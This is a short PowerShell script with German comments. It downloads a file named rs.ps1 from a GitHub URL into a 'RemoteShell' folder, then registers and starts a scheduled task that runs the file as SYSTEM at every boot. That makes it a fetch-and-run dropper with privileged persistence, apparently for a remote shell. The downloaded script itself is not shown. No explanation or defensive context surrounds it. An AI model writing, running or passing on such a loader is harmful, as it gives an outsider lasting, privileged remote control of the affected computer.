$url = "https://raw.githubusercontent.com/fiveraptor/rs/main/rs.ps1"
$zielSpeicherort = "C:\RemoteShell\rs.ps1"

# Erstelle eine WebClient-Instanz
$webClient = New-Object System.Net.WebClient

# Lade die Datei herunter und speichere sie am gewünschten Speicherort
$webClient.DownloadFile($url, $zielSpeicherort)


Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-File "C:\RemoteShell\rs.ps1"') -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName "rs" -Principal (New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount) -Settings (New-ScheduledTaskSettingsSet  -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)

Start-ScheduledTask -TaskName "rs"
